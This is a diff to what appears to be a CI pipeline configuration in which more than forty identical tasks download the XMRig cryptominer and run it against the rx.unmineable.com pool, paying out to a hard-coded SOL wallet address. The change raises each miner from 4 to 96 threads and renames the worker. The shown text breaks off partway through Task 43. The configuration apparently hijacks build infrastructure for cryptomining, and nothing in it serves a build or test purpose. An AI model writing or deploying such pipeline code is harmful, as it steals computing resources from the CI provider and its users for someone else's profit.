@@ -15,7 +15,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 2
           commands:
             - sudo apt update
@@ -23,7 +23,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 3
           commands:
             - sudo apt update
@@ -31,7 +31,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 4
           commands:
             - sudo apt update
@@ -39,7 +39,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 5
           commands:
             - sudo apt update
@@ -47,7 +47,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 6
           commands:
             - sudo apt update
@@ -55,7 +55,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 7
           commands:
             - sudo apt update
@@ -63,7 +63,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 8
           commands:
             - sudo apt update
@@ -71,7 +71,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 9
           commands:
             - sudo apt update
@@ -79,7 +79,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 10
           commands:
             - sudo apt update
@@ -87,7 +87,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 11
           commands:
             - sudo apt update
@@ -95,7 +95,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 12
           commands:
             - sudo apt update
@@ -103,7 +103,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 13
           commands:
             - sudo apt update
@@ -111,7 +111,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 14
           commands:
             - sudo apt update
@@ -119,7 +119,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 15
           commands:
             - sudo apt update
@@ -127,7 +127,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 16
           commands:
             - sudo apt update
@@ -135,7 +135,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 17
           commands:
             - sudo apt update
@@ -143,7 +143,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 18
           commands:
             - sudo apt update
@@ -151,7 +151,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 19
           commands:
             - sudo apt update
@@ -159,7 +159,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 20
           commands:
             - sudo apt update
@@ -167,7 +167,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 21
           commands:
             - sudo apt update
@@ -175,7 +175,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 22
           commands:
             - sudo apt update
@@ -183,7 +183,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 23
           commands:
             - sudo apt update
@@ -191,7 +191,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 24
           commands:
             - sudo apt update
@@ -199,7 +199,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 25
           commands:
             - sudo apt update
@@ -207,7 +207,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 26
           commands:
             - sudo apt update
@@ -215,7 +215,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 27
           commands:
             - sudo apt update
@@ -223,7 +223,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 28
           commands:
             - sudo apt update
@@ -231,7 +231,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 29
           commands:
             - sudo apt update
@@ -239,7 +239,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 30
           commands:
             - sudo apt update
@@ -247,7 +247,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 31
           commands:
             - sudo apt update
@@ -255,7 +255,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 32
           commands:
             - sudo apt update
@@ -263,7 +263,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 33
           commands:
             - sudo apt update
@@ -271,7 +271,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 34
           commands:
             - sudo apt update
@@ -279,7 +279,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 35
           commands:
             - sudo apt update
@@ -287,7 +287,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 36
           commands:
             - sudo apt update
@@ -295,7 +295,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 37
           commands:
             - sudo apt update
@@ -303,7 +303,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 38
           commands:
             - sudo apt update
@@ -311,7 +311,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 39
           commands:
             - sudo apt update
@@ -319,7 +319,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 40
           commands:
             - sudo apt update
@@ -327,7 +327,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 41
           commands:
             - sudo apt update
@@ -335,7 +335,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 42
           commands:
             - sudo apt update
@@ -343,7 +343,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 43
           commands:
             - sudo apt update
@@ -351,7 +351,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
